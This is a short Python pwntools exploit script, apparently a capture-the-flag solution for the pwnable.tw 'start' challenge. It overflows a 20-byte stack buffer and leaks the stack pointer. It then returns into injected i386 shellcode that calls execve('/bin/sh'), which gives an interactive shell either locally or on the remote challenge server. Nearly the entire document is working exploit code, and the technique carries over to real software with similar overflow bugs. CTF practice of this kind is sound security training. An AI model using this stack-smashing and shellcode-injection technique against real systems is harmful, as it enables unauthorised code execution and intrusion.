#!/usr/bin/env python3
from pwn import *
from sys import argv
context.arch = 'i386'
binary = ELF('start', checksec=0)
# libc = ELF()
if len(argv) >= 2 and argv[1] == '-r':
  p = remote('chall.pwnable.tw', 10000)
else:
  p = binary.process(env={})
s = lambda x, r="" : \
  p.sendafter(r, x) if r else p.send(x)
sl = lambda x, r="" : \
  p.sendlineafter(r, x) if r else p.sendline(x)

str_bin = u32(b'/bin')
str_sh = u32(b'/sh\x00')
shellcode = asm('\n'.join([
  f'push {str_sh}',
  f'push {str_bin}',
  'push 11',
  'pop eax',
  'mov ebx, esp',
  'xor ecx, ecx',
  'xor edx, edx',
  'int 0x080',
]))
pause()
offset = 20
print(shellcode)
payload1 = b'A'*offset
payload1 += p32(0x8048087)
p.sendafter(b'Let\'s start the CTF:', payload1)
leak_esp = u32(p.recv(4))
log.info("Leaked esp pointer: %#lx"%leak_esp)
payload2 = b'A'*offset
payload2 += p32(leak_esp+20)
payload2 += shellcode
p.send(payload2)
p.interactive()

